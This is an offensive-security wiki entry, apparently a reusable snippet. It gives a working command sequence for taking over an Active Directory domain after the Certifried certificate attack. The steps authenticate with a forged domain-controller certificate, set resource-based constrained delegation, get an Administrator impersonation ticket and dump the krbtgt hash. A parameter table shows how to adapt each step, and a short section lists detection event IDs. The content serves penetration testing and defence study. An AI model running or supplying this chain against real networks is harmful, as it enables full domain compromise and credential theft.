---
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:06.137520+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
platforms:
  - Windows
tags:
  - domain-takeover
  - rbcd
  - credential-access
validated: true
---

# perform-domain-takeover-with-cert-sequence

## Code

```ps1
certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

openssl pkcs12 -in dc.pfx -out dc.pem -nodes
python bloodyAD.py -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'
getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
```

## Description

Multi-tool sequence to authenticate with the forged DC certificate, convert to PEM, set RBCD, obtain an impersonation ticket, and dump domain secrets. This completes the domain takeover.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| dc.pfx | Forged certificate PFX (replace with $_PFX_FILE) | dc.pfx |
| 10.10.10.10 | DC IP (replace with $_DC_IP) | 10.10.10.10 |
| dc.pem | Output PEM file (replace with $_PEM_FILE) | dc.pem |
| lab.local | Domain (replace with $_DOMAIN) | lab.local |
| cve$ | Rogue computer (replace with $_COMPUTER_NAME$) | cve$ |
| CVE$ | Uppercase computer (replace with uppercase $_COMPUTER_NAME$) | CVE$ |
| CRASHDC$ | Target DC account (replace with $_TARGET_DC$) | CRASHDC$ |
| CRASHDC.lab.local | Target DC FQDN (replace with $_TARGET_DC_FQDN) | CRASHDC.lab.local |
| Administrator | Impersonate user (replace with $_TARGET_USER) | Administrator |
| CVEPassword1234* | Computer password (replace with $_COMPUTER_PASSWORD) | CVEPassword1234* |
| dc.lab.local | DC FQDN (replace with $_DC_FQDN) | dc.lab.local |
| krbtgt | Target user for dump | krbtgt |

## Usage

Run after obtaining the DC certificate. This sequence assumes the RBCD target is the real DC. Export tickets as needed for -k flag in secretsdump.

## Detection

- Certificate authentication logs (Event ID 4769 with cert SID).
- RBCD modifications (Event ID 5136 for msDS-AllowedToActOnBehalfOfOtherIdentity).
- Unusual S4U ticket requests and DCSync-like dumps (Event ID 4662).

## Related

- [[procedures/Domain-Takeover-via-Certifried-CVE-2022-26923]]
